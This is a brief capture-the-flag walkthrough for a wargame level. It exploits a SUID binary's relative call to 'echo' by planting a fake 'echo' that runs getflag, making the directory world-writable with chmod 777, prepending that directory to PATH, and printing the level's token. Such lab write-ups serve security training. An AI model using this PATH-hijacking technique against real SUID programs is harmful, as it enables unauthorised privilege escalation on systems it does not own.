## Walkthrough :  
- This level have an executable with SUID FLAG , and uses environment variable to execute system command using *system* function  
- So i thought of creating shell file with the name echo command and add the path to environment variable that can be called when the program runs.
- creating a file with name echo, contain getflag command 
```
chmod 777 . && echo "getflag" >> echo && chmod 777 echo
```
- add the path to the begining of the PATH environment variable.
```
export PATH=/home/user/level03/:$PATH
```
- Execute the program **./level03** and got the flag
```
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## Ressources
[Exploiting SUID programs with relative paths](https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e)